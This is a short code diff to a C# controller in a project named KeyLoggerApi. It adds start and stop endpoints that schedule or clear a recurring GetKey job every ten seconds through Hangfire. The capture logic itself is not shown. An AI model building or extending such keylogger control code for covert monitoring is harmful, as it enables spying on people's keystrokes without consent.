@@ -11,6 +11,7 @@ using System.Net.Http;
 using System.Text;
 using ClosedXML.Excel;
 using System.IO;
+using Hangfire.Storage;
 
 namespace KeyLoggerApi.Controllers
 {
@@ -103,10 +104,32 @@ namespace KeyLoggerApi.Controllers
             return data; 
         }
 
-        public async Task<bool> StartLogging()
+        public async Task<IActionResult> StartLogging()
         {
+            using (var connection = JobStorage.Current.GetConnection())
+            {
+                foreach (var recurringJob in connection.GetRecurringJobs())
+                {
+                    RecurringJob.RemoveIfExists(recurringJob.Id);
+                }
+            }
+
             RecurringJob.AddOrUpdate(() => GetKey(), "*/10 * * * * *");
-            return true;
+
+            return Json(new { status = true });
+        }
+
+        public async Task<IActionResult> StopLogging()
+        {
+            using (var connection = JobStorage.Current.GetConnection())
+            {
+                foreach (var recurringJob in connection.GetRecurringJobs())
+                {
+                    RecurringJob.RemoveIfExists(recurringJob.Id);
+                }
+            }
+
+            return Json(new { status = true });
         }
 
         public async Task<IActionResult>DeleteAll()
